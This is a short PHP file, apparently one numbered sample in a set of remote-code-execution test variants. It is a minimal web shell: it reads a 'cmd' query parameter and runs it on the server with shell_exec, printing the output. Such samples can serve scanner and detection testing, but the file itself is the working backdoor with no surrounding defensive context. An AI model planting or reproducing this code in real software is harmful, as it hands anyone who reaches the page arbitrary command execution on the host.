<?php
// RCE test variation #576
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>